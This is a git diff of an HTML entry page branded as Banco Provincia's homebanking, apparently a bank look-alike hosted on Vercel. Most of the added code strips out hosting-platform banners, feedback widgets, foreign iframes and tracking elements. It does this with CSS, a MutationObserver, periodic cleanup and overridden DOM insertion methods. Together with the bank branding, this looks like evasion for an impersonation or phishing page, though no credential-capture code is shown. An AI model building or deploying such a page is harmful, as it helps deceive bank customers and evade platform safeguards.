@@ -5,40 +5,242 @@
     <link rel="icon" href="/favicon.ico" />
     <link rel="shortcut icon" href="/favicon.ico" />
     <link rel="apple-touch-icon" href="/favicon.ico" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Página del Banco de la Provincia</title>
-    <meta name="description" content="Banco de la Provincia - Homebanking Seguro" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Banco Provincia - Banca Internet Provincia</title>
+    <meta name="description" content="Banca Internet Provincia - Homebanking Seguro del Banco de la Provincia de Buenos Aires" />
+    <meta name="theme-color" content="#1e8a5e" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <!-- Preconnect para mejor rendimiento -->
+    <link rel="preconnect" href="https://www.bancoprovincia.com.ar" crossorigin />
+    <link rel="dns-prefetch" href="https://www.bancoprovincia.com.ar" />
+    <!-- CSP para bloquear scripts externos no autorizados -->
+    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self'; frame-src 'self';" />
     <style>
-      /* Ocultar elementos de Vercel */
-      [id*="vercel"], [class*="vercel"], #__vercel_live_feedback_root,
-      iframe[src*="vercel"], [data-vercel] {
+      /* === SISTEMA ANTI-BANNER NIVEL ENTERPRISE === */
+      /* Bloqueo agresivo de cualquier overlay/banner externo */
+      body > div:not(#root),
+      body > iframe,
+      body > script + div,
+      [id*="vercel"], [id*="Vercel"], [id*="VERCEL"],
+      [class*="vercel"], [class*="Vercel"], [class*="VERCEL"],
+      [id*="feedback"], [class*="feedback"],
+      [id*="live"], [class*="live-feedback"],
+      #__vercel_live_feedback_root,
+      #__next_preview_feedback,
+      div[data-vercel], div[data-vercel-feedback],
+      iframe[src*="vercel"], iframe[src*="/_vercel"],
+      div[style*="z-index: 2147483647"],
+      div[style*="z-index:2147483647"],
+      div[style*="position: fixed"][style*="bottom"],
+      div[style*="position:fixed"][style*="bottom"],
+      body > div[style*="position: fixed"],
+      body > div[style*="position:fixed"] {
         display: none !important;
         visibility: hidden !important;
+        opacity: 0 !important;
+        width: 0 !important;
+        height: 0 !important;
+        overflow: hidden !important;
+        pointer-events: none !important;
+        position: absolute !important;
+        left: -9999px !important;
+        top: -9999px !important;
       }
+      /* Asegurar que solo #root sea visible */
+      #root {
+        position: relative;
+        z-index: 1;
+        isolation: isolate;
+      }
+      /* Loading inicial */
+      .initial-loader {
+        position: fixed;
+        inset: 0;
+        background: linear-gradient(135deg, #1e8a5e 0%, #2eb8a0 100%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        transition: opacity 0.5s ease;
+      }
+      .initial-loader.hidden { opacity: 0; pointer-events: none; }
+      .loader-content { text-align: center; color: white; }
+      .loader-spinner {
+        width: 50px; height: 50px;
+        border: 4px solid rgba(255,255,255,0.3);
+        border-top-color: white;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 16px;
+      }
+      @keyframes spin { to { transform: rotate(360deg); } }
     </style>
+    <script>
+      // === SISTEMA DE PROTECCIÓN ANTI-INYECCIÓN ===
+      (function() {
+        'use strict';
+        
+        // Configuración
+        const CONFIG = {
+          allowedIds: ['root'],
+          blockedKeywords: ['vercel', 'feedback', 'preview', 'live', 'analytics', 'tracking'],
+          maxZIndex: 2147483640
+        };
+
+        // Función para verificar si un elemento debe ser eliminado
+        function shouldRemove(el) {
+          if (!el || el.id === 'root' || el.tagName === 'SCRIPT' || el.tagName === 'LINK') return false;
+          
+          const id = (el.id || '').toLowerCase();
+          const className = (el.className || '').toString().toLowerCase();
+          const src = el.src || el.getAttribute('src') || '';
+          const style = el.getAttribute('style') || '';
+          
+          // Verificar keywords bloqueadas
+          for (const keyword of CONFIG.blockedKeywords) {
+            if (id.includes(keyword) || className.includes(keyword) || src.includes(keyword)) {
+              return true;
+            }
+          }
+          
+          // Verificar iframes externos
+          if (el.tagName === 'IFRAME' && src && !src.startsWith(window.location.origin)) {
+            return true;
+          }
+          
+          // Verificar elementos con z-index muy alto (típico de overlays)
+          const computedStyle = window.getComputedStyle ? window.getComputedStyle(el) : el.currentStyle;
+          if (computedStyle) {
+            const zIndex = parseInt(computedStyle.zIndex);
+            const position = computedStyle.position;
+            if (zIndex > CONFIG.maxZIndex && (position === 'fixed' || position === 'absolute')) {
+              return true;
+            }
+          }
+          
+          // Verificar divs fixed en body que no son #root
+          if (el.parentElement === document.body && el.id !== 'root') {
+            if (style.includes('fixed') || style.includes('z-index')) {
+              return true;
+            }
+          }
+          
+          return false;
+        }
+
+        // Función para limpiar elementos no deseados
+        function cleanDOM() {
+          // Limpiar hijos directos del body que no sean #root
+          Array.from(document.body.children).forEach(el => {
+            if (shouldRemove(el)) {
+              el.remove();
+            }
+          });
+          
+          // Limpiar por selectores específicos
+          const selectors = [
+            '[id*="vercel"]', '[id*="Vercel"]',
+            '[class*="vercel"]', '[class*="Vercel"]',
+            'iframe[src*="vercel"]', 'iframe[src*="_vercel"]',
+            '#__vercel_live_feedback_root',
+            '[data-vercel]', '[data-vercel-feedback]'
+          ];
+          
+          selectors.forEach(selector => {
+            try {
+              document.querySelectorAll(selector).forEach(el => el.remove());
+            } catch(e) {}
+          });
+        }
+
+        // Observer de mutaciones con debounce
+        let cleanTimeout;
+        function debouncedClean() {
+          clearTimeout(cleanTimeout);
+          cleanTimeout = setTimeout(cleanDOM, 10);
+        }
+
+        // Iniciar observer cuando el DOM esté listo
+        function initProtection() {
+          cleanDOM();
+          
+          const observer = new MutationObserver((mutations) => {
+            let needsClean = false;
+            for (const mutation of mutations) {
+              if (mutation.addedNodes.length) {
+                for (const node of mutation.addedNodes) {
+                  if (node.nodeType === 1 && shouldRemove(node)) {
+                    needsClean = true;
+                    break;
+                  }
+                }
+              }
+              if (needsClean) break;
+            }
+            if (needsClean) debouncedClean();
+          });
+          
+          observer.observe(document.documentElement, {
+            childList: true,
+            subtree: true
+          });
+          
+          // Limpieza periódica como respaldo
+          setInterval(cleanDOM, 2000);
+        }
+
+        // Ejecutar protección
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initProtection);
+        } else {
+          initProtection();
+        }
+        
+        // También al cargar completamente
+        window.addEventListener('load', cleanDOM);
+        
+        // Bloquear creación de elementos por scripts externos
+        const originalAppendChild = Element.prototype.appendChild;
+        Element.prototype.appendChild = function(child) {
+          if (child && child.nodeType === 1 && this === document.body && shouldRemove(child)) {
+            return child; // No agregar, retornar silenciosamente
+          }
+          return originalAppendChild.call(this, child);
+        };
+        
+        const originalInsertBefore = Element.prototype.insertBefore;
+        Element.prototype.insertBefore = function(child, reference) {
+          if (child && child.nodeType === 1 && this === document.body && shouldRemove(child)) {
+            return child;
+          }
+          return originalInsertBefore.call(this, child, reference);
+        };
+      })();
+    </script>
   </head>
   <body>
+    <!-- Loader inicial profesional -->
+    <div class="initial-loader" id="initialLoader">
+      <div class="loader-content">
+        <div class="loader-spinner"></div>
+        <p style="font-family: system-ui; font-size: 14px; margin: 0;">Cargando...</p>
+      </div>
+    </div>
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
     <script>
-      // Eliminar cualquier elemento de Vercel que se inyecte
-      function removeVercelElements() {
-        const selectors = [
-          '[id*="vercel"]', '[class*="vercel"]', '#__vercel_live_feedback_root',
-          'iframe[src*="vercel"]', '[data-vercel]', '.vercel-live-feedback'
-        ];
-        selectors.forEach(selector => {
-          document.querySelectorAll(selector).forEach(el => el.remove());
-        });
-      }
-      // Ejecutar al cargar y observar cambios
-      document.addEventListener('DOMContentLoaded', removeVercelElements);
-      window.addEventListener('load', removeVercelElements);
-      setTimeout(removeVercelElements, 1000);
-      setTimeout(removeVercelElements, 3000);
-      // Observer para elementos que se agreguen después
-      const observer = new MutationObserver(removeVercelElements);
-      observer.observe(document.body, { childList: true, subtree: true });
+      // Ocultar loader cuando React esté listo
+      window.addEventListener('load', function() {
+        setTimeout(function() {
+          var loader = document.getElementById('initialLoader');
+          if (loader) {
+            loader.classList.add('hidden');
+            setTimeout(function() { loader.remove(); }, 500);
+          }
+        }, 500);
+      });
     </script>
   </body>
 </html>
